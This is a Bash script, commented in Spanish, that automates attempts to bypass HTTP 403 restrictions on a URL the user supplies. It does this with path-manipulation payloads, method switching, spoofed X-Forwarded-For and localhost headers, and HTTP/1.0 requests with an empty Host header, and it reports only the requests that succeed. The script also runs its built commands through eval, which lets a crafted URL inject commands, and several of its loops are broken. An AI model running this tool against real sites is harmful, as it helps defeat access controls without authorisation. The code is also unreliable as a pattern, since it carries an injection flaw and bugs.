#!/bin/bash
# 403bypass5.sh
# Muestra SOLO casos 200 OK + imprime la petición curl completa con -v
# Permite pasar la URL completa de una vez
#
# Uso:
#   ./403bypass5.sh https://target.com/ruta/protegida/
#   ./403bypass5.sh https://ejemplo.com/admin

if [ $# -ne 1 ]; then
    echo "Uso: $0 <URL_COMPLETA>"
    echo "Ejemplos:"
    echo "  $0 https://target.com/admin/"
    echo "  $0 https://ejemplo.com/panel"
    exit 1
fi

FULL_TARGET="$1"

# Quitamos posible / final para normalizar
FULL_TARGET="${FULL_TARGET%/}"

echo ""
echo "============================================================="
echo " Pruebas de bypass 403 → $FULL_TARGET/"
echo " (solo se muestran respuestas 200 OK)"
echo "============================================================="
echo ""

# ────────────────────────────────────────────────
#  Payloads de path (relativos al final de la URL base)
# ────────────────────────────────────────────────
payloads() {
    cat << 'EOF'
/
//
/.
/../${LAST_DIR}/
/%2e/
/%2e%2e/${LAST_DIR}/
/.;/
/..;/
/%20/
/%09/
/?
/%3f
/%23
/*
/.random
/index.aspx
/default.aspx
EOF
}

# Extraemos el "último directorio" para algunos payloads relativos
LAST_DIR=$(basename "$FULL_TARGET")

# ────────────────────────────────────────────────
#  Métodos a probar
# ────────────────────────────────────────────────
METHODS="GET HEAD OPTIONS POST"

# ────────────────────────────────────────────────
#  Cabeceras especiales
# ────────────────────────────────────────────────
special_headers() {
    cat << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 127.0.0.1:80
X-Forwarded-For: ::1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
Forwarded: for=127.0.0.1;proto=https;by=localhost
EOF
}

# ────────────────────────────────────────────────
#  Función auxiliar: ejecuta curl y muestra solo si es 200
# ────────────────────────────────────────────────
run_curl() {
    local cmd="$1"
    echo "$cmd"
    echo "--------------------------------------------------"
    
    # Ejecutamos con -v para ver el request completo
    # -s para no mostrar barra de progreso
    # -m 8 timeout
    # -w para capturar el código de estado
    output=$(eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1)
    
    http_code=$(echo "$output" | tail -n1)
    
    if [[ "$http_code" == "200" ]]; then
        echo "$output" | grep -v "^{" | grep -v "^}" | grep -v "^* "
        echo ""
        echo ">>> ÉXITO 200 OK DETECTADO <<<"
        echo "--------------------------------------------------"
        echo ""
    fi
}

# ────────────────────────────────────────────────
#  1. Variaciones de path + distintos métodos
# ────────────────────────────────────────────────
echo "[*] 1. Variaciones de PATH + cambio de método"
echo "-------------------------------------------------------------"

for payload in $(payloads); do
    test_url="${FULL_TARGET}${payload}"
    
    for method in $METHODS; do
        cmd="curl -X $method -I \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
#  2. Cabeceras de spoofing (solo GET por ahora)
# ────────────────────────────────────────────────
echo ""
echo "[*] 2. Cabeceras de proxy / localhost spoofing (GET)"
echo "-------------------------------------------------------------"

for header in $(special_headers); do
    for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
        test_url="${FULL_TARGET}${extra}"
        cmd="curl -X GET -I -H \"$header\" \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
#  3. Trucos clásicos HTTP/1.0 + Host vacío
# ────────────────────────────────────────────────
echo ""
echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
echo "-------------------------------------------------------------"

test_url="${FULL_TARGET}/"

# Normal
cmd="curl -I \"$test_url\""
run_curl "$cmd"

# HTTP/1.0 sin Host
cmd="curl --http1.0 -I \"$test_url\""
run_curl "$cmd"

# HTTP/1.0 + Host vacío
cmd="curl --http1.0 -I -H \"Host:\" \"$test_url\""
run_curl "$cmd"

echo 
